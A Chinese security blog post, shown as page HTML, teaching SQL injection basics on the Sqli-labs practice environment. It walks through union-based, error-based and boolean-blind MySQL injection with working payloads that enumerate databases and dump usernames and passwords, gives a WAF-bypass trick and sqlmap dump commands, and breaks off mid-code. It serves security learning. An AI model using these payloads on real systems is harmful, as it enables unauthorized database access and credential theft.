<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SQL注入基础 | Wawyw's Blog</title><meta name="keywords" content="Web安全学习,SQL"><meta name="author" content="wawyw"><meta name="copyright" content="wawyw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="SQL注入就是通过把SQL命令插入到 Web表单提交 或 URL 或 页面请求等的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令。即：将构造的SQL语句插入到正常提交的字符串中，并使服务器将字符串中的命令解析为可执行命令而不是字符串。 SQL注入产生的原因：许多网页程序员在编写代码的时候，没有对用户输入数据的合法性进行严格的判断和过滤，从而导致应用程序存在该漏洞。 MySQL手工注入原理："><meta property="og:type" content="article"><meta property="og:title" content="SQL注入基础"><meta property="og:url" content="https://www.wawyw.top/posts/20316.html"><meta property="og:site_name" content="Wawyw&#39;s Blog"><meta property="og:description" content="SQL注入就是通过把SQL命令插入到 Web表单提交 或 URL 或 页面请求等的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令。即：将构造的SQL语句插入到正常提交的字符串中，并使服务器将字符串中的命令解析为可执行命令而不是字符串。 SQL注入产生的原因：许多网页程序员在编写代码的时候，没有对用户输入数据的合法性进行严格的判断和过滤，从而导致应用程序存在该漏洞。 MySQL手工注入原理："><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sql.jpg"><meta property="article:published_time" content="2021-02-19T13:50:00.000Z"><meta property="article:modified_time" content="2021-03-08T09:19:31.397Z"><meta property="article:author" content="wawyw"><meta property="article:tag" content="Web安全学习"><meta property="article:tag" content="SQL"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sql.jpg"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://www.wawyw.top/posts/20316"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="preconnect" href="//zz.bdstatic.com"><link rel="manifest" href="/image/pwa/manifest.json"><link rel="apple-touch-icon" sizes="180x180" href="/image/pwa/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/image/pwa/32.png"><link rel="icon" type="image/png" sizes="16x16" href="/image/pwa/16.png"><link rel="mask-icon" href="/image/pwa/safari-pinned-tab.svg" color="#5bbad5"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload='this.media="all"'><script>var GLOBAL_CONFIG={root:"/",algolia:void 0,localSearch:{path:"search.xml",languages:{hits_empty:"找不到您查询的内容：${query}"}},translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"繁",msgToSimplifiedChinese:"簡"},noticeOutdate:void 0,highlight:{plugin:"highlighjs",highlightCopy:!0,highlightLang:!0},copy:{success:"复制成功",error:"复制错误",noSupport:"浏览器不支持"},relativeDate:{homepage:!1,post:!1},runtime:"天",date_suffix:{just:"刚刚",min:"分钟前",hour:"小时前",day:"天前",month:"个月前"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"你已切换为繁体",cht_to_chs:"你已切换为简体",day_to_night:"你已切换为深色模式",night_to_day:"你已切换为浅色模式",bgLight:"#a91e50",bgDark:"#121212",position:"top-center"},source:{jQuery:"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js",justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js",css:"https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css"},fancybox:{js:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js",css:"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"}},isPhotoFigcaption:!1,islazyload:!1,isanchor:!0},saveToLocal={set:function(t,e,s){const n=864e5*s,a={value:e,expiry:(new Date).getTime()+n};localStorage.setItem(t,JSON.stringify(a))},get:function(t){const e=localStorage.getItem(t);if(!e)return;const s=JSON.parse(e);if(!((new Date).getTime()>s.expiry))return s.value;localStorage.removeItem(t)}};const getScript=t=>new Promise((e,s)=>{const n=document.createElement("script");n.src=t,n.async=!0,n.onerror=s,n.onload=n.onreadystatechange=function(){const t=this.readyState;t&&"loaded"!==t&&"complete"!==t||(n.onload=n.onreadystatechange=null,e())},document.head.appendChild(n)})</script><script id="config_change">var GLOBAL_CONFIG_SITE={isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2021-03-08 17:19:31"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>!function(){window.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},window.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const e=saveToLocal.get("theme");"dark"===e?activateDarkMode():"light"===e&&activateLightMode();const t=saveToLocal.get("aside-status");void 0!==t&&("hide"===t?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));const o=saveToLocal.get("global-font-size");void 0!==o&&document.documentElement.style.setProperty("--global-font-size",o+"px")}()</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zyoushuo/Blog@latest/hexo/css/loading_style_1.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/zyoushuo/Blog@latest/hexo/css/loading_style_2.css"><link rel="stylesheet" href="/css/history.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-card-history/baiduhistory/css/main.css"><style>.app-refresh{position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease}.app-refresh-wrap{display:flex;color:#fff;height:100%;align-items:center;justify-content:center}.app-refresh-wrap a{color:#fff;text-decoration:underline;cursor:pointer}</style><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/tags.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/plugins.min.css"><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="Wawyw's Blog" type="application/atom+xml"></head><body><div id="loader"><div class="outer_box"><div class="loader_overlay"></div><div class="loader_cogs"><div class="loader_cogs__top"><div class="top_part"></div><div class="top_part"></div><div class="top_part"></div><div class="top_hole"></div></div><div class="loader_cogs__left"><div class="left_part"></div><div class="left_part"></div><div class="left_part"></div><div class="left_hole"></div></div><div class="loader_cogs__bottom"><div class="bottom_part"></div><div class="bottom_part"></div><div class="bottom_part"></div><div class="bottom_hole"></div></div><p style="text-align:center">&nbsp;&nbsp;&nbsp;loading...</p></div></div></div><script>var endLoading=function(){document.body.style.overflow="auto",document.getElementById("loader").classList.add("loading")};window.addEventListener("load",endLoading)</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/avatar.png" onerror='onerror=null,src="/img/friend_404.gif"' alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/law/"><i class="fa-fw fas fa-balance-scale"></i> <span>法规</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i> <span>文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/friend-link-circle/"><i class="fa-fw fas fa-heartbeat"></i> <span>朋友圈</span></a></div><div class="menus_item"><a class="site-page" href="/speak/"><i class="fa-fw fas fa-quote-left"></i> <span>碎碎念</span></a></div><div class="menus_item"><a class="site-page" href="/README/"><i class="fa-fw fas fa-heart"></i> <span>README</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image:url(https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/sql.jpg)"><nav id="nav"><span id="blog_name"><img src="https://cdn.jsdelivr.net/gh/wawyw/img/logo.png" alt="logo" style="vertical-align:middle;margin-right:10px"><a id="site-name" href="/">Wawyw's Blog</a></span><span id="weather-v2-plugin-simple"></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i> <span>搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>首页</span></a></div><div class="menus_item"><a class="site-page" href="/law/"><i class="fa-fw fas fa-balance-scale"></i> <span>法规</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i> <span>文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i> <span>归档</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>分类</span></a></li><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i> <span>友链</span></a></div><div class="menus_item"><a class="site-page" href="/friend-link-circle/"><i class="fa-fw fas fa-heartbeat"></i> <span>朋友圈</span></a></div><div class="menus_item"><a class="site-page" href="/speak/"><i class="fa-fw fas fa-quote-left"></i> <span>碎碎念</span></a></div><div class="menus_item"><a class="site-page" href="/README/"><i class="fa-fw fas fa-heart"></i> <span>README</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-02-19T13:50:00.000Z" title="发表于 2021-02-19 21:50:00">2021-02-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-08T09:19:31.397Z" title="更新于 2021-03-08 17:19:31">2021-03-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">Web安全学习</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote><p>SQL注入就是通过把SQL命令插入到 Web表单提交 或 URL 或 页面请求等的查询字符串中，最终达到欺骗服务器执行恶意的SQL命令。即：将构造的SQL语句插入到正常提交的字符串中，并使服务器将字符串中的命令解析为可执行命令而不是字符串。</p><p>SQL注入产生的原因：许多网页程序员在编写代码的时候，没有对用户输入数据的合法性进行严格的判断和过滤，从而导致应用程序存在该漏洞。</p><p>MySQL手工注入原理：主要是利用mysql自带的information_schema数据库，information_schema这个数据库保存了MySQL上所有数据库的信息。如有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema数据库里面。</p></blockquote><p>SQL注入练习环境：Sqlilabs</p><p><a target="_blank" rel="noopener" href="https://github.com/Rinkish/Sqli_Edited_Version">https://github.com/Rinkish/Sqli_Edited_Version</a></p><h1 id="GET-Union注入"><a href="#GET-Union注入" class="headerlink" title="GET Union注入"></a>GET Union注入</h1><h2 id="手动测试"><a href="#手动测试" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.判断是否存在注入点</strong></p><p>通过在URL中修改对应的ID值，为正常数字，大数字，字符（单引号，双引号，双单引号，括号，反斜杆)来探测URL中是否存在注入点。</p><p>判断注入类型：</p><p>数字型注入：id=1 返回正常 –&gt; id=2-1 返回正常</p><p>字符型注入：id=1 返回正常 –&gt; id=1a 返回正常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1    #正常显示</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203101671.png" alt="image-20201130203101671"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;   </span><br><span class="line">&#x2F;&#x2F;添加单引号后报错,猜测sql语句 SELECT * FROM users WHERE id&#x3D;&#39;1&#39;&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231003746.png" alt="image-20201128231003746"></p><p><strong>2.添加注释（添加的单引号闭合前面的单引号，再用注释符注释掉后面内容）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--+        </span><br><span class="line">&#x2F;&#x2F;后面加上and &#39;1&#39;&#x3D;&#39;1 ,or &#39;1&#39;&#x3D;&#39;1 ,and &#39;1&#39; like &#39;1，or&#39; &#39;&#x3D;1&#x3D;&#39; 亦可，闭合单引号</span><br><span class="line">sql语句 SELECT * FROM users WHERE id&#x3D;&#39;1&#39;-- &#39; LIMIT 0,1</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231239638.png" alt="image-20201128231239638"></p><p>注释符：在Mysql中常见的注释符表达式：#(%23) 或–空 格或 /**/</p><p>内联注释： /*! SQL语句 */ 只有Mysql可以识别，常用来绕过WAF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from articles where id &#x3D; -1 &#x2F;*!union*&#x2F; &#x2F;*!select*&#x2F; 1,2,3,4</span><br></pre></td></tr></table></figure><p><strong>3.判断字段数量(使用order by 对字段排序)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 1--+  #对第一列排序，正常</span><br></pre></td></tr></table></figure><p>……</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4--+  #对第四列排序，报错，表明没有第四列</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128231715638.png" alt="image-20201128231715638"></p><p>即有3个字段</p><p><strong>4.报显示位，id设为查询不到的数据（使用union联合查询，前后的表中要有相同的字段数，然后让左边查询无结果，右边有结果）</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128232240296.png" alt="image-20201128232240296"></p><p><strong>5.查询相关信息</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,database(),3--+  #查询当前数据库</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128233025336.png" alt="image-20201128233025336"></p><p>其他信息 user(),version()…</p><p><strong>6.查询具体信息</strong></p><p>1）查询所有库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(schema_name),3 from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234024839.png" alt="image-20201128234024839"></p><p>2）查询当前库的所有表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234247143.png" alt="image-20201128234247143"></p><p>3）查询表中字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure><p>引号内 users 转换为十六进制亦可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128234755093.png" alt="image-20201128234755093"></p><p><strong>7.查询数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,group_concat(id,0x3a,password,0x3a,username),3 from users--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201128235121970.png" alt="image-20201128235121970"></p><p><strong>8.查询基本信息</strong></p><p>查询基本信息主要是利用数据库中的内置函数来获取信息。</p><ul><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ul><h2 id="利用Sqlmap测试"><a href="#利用Sqlmap测试" class="headerlink" title="利用Sqlmap测试"></a><strong>利用Sqlmap测试</strong></h2><p>Sqlmap是检测和利用SQL注入漏洞的一款强大工具。</p><p><strong>1.查询库</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --dbs --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129153523160.png" alt="image-20201129153523160"></p><p><strong>2.查询表</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security --tables --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154040322.png" alt="image-20201129154040322"></p><p><strong>3.查询字段</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users --columns --batch</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154015859.png" alt="image-20201129154015859"></p><p><strong>4.查询数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-1&#x2F;?id&#x3D;1&quot; -D security -T users -C id,password,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201129154914063.png" alt="image-20201129154914063"></p><p><strong>Sqlmap检测过程中的payload</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: id&#x3D;1&#39; AND 6535&#x3D;6535 AND &#39;MMEg&#39;&#x3D;&#39;MMEg</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND EXTRACTVALUE(6529,CONCAT(0x5c,0x7162717a71,(SELECT (ELT(6529&#x3D;6529,1))),0x7176767a71)) AND &#39;SxoL&#39;&#x3D;&#39;SxoL</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id&#x3D;1&#39; AND (SELECT 9353 FROM (SELECT(SLEEP(5)))yGeE) AND &#39;aMBL&#39;&#x3D;&#39;aMBL</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: id&#x3D;-3115&#39; UNION ALL SELECT NULL,CONCAT(0x7162717a71,0x7372786d534b54684f795a787a4e736962676675516963714d7759496751777a4b41614f57426376,0x7176767a71),NULL-- -</span><br></pre></td></tr></table></figure><h1 id="GET-报错注入"><a href="#GET-报错注入" class="headerlink" title="GET 报错注入"></a>GET 报错注入</h1><p>在没有数据回显的时候，通过报错来显示具体的信息</p><p>1.<strong>floor()函数</strong></p><p>原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/shuteer_xu/article/details/104438405">Mysql报错注入之函数分析</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">注入公式（Payload为自己想获取内容的脚本）：</span><br><span class="line">and(select 1 from (select count(*),concat(concat(payload),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">and(select 1 from (select count(*),concat(concat(database(),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;暴库</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(table_name) from information_schema.tables where table_schema&#x3D;&quot;security&quot; limit 3,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询表</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(column_name) from information_schema.columns where table_schema&#x3D;&quot;security&quot; and table_name&#x3D;&quot;users&quot; limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询字段</span><br><span class="line">and(select 1 from (select count(*),concat(concat((select concat(username,0x7e,password,0x7e) from security.users limit 1,1),0x7e),floor(rand(0)*2))x from information_schema.tables group by x)y)</span><br><span class="line">&#x2F;&#x2F;查询字段内容</span><br></pre></td></tr></table></figure><p>2.<strong>extractvalue()函数</strong></p><p>extractvalue(目标xml文档，xml路径) :对XML文档进行查询的函数</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><p>注意：extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</p><p>extractvalue() 函数不支持低版本 mysql</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x7e,(payload),0x7e))</span><br></pre></td></tr></table></figure><p><strong>3.updatexml()函数</strong></p><p>updatexml(目标xml文档，xml路径，更新的内容)：对xml文档进行更新的函数</p><p>updatexml和上面的extractvlaue函数基本上相差不大，用法也相同</p><p>注：高版本的mysql已经修复了该bug</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x7e,(payload),0x7e),1)</span><br></pre></td></tr></table></figure><h1 id="GET-布尔盲注"><a href="#GET-布尔盲注" class="headerlink" title="GET 布尔盲注"></a>GET 布尔盲注</h1><p>在没有报错信息时，根据页面回显情况不同考虑布尔盲注</p><h2 id="手动测试-1"><a href="#手动测试-1" class="headerlink" title="手动测试"></a>手动测试</h2><p><strong>1.检测是否存在注入点</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1     #页面正常显示</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203312421.png" alt="image-20201130203312421"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39;    #无报错信息，但不返回&quot;You are in......&quot;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130203507136.png" alt="image-20201130203507136"></p><p><strong>2.判断当前数据库的长度</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;sqlilabs&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and length(database()) &gt; 5--+</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201130204339111.png" alt="image-20201130204339111"></p><p><strong>length(str)</strong> 返回字符串长度</p><p>页面显示正常，说明库名长度大于5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 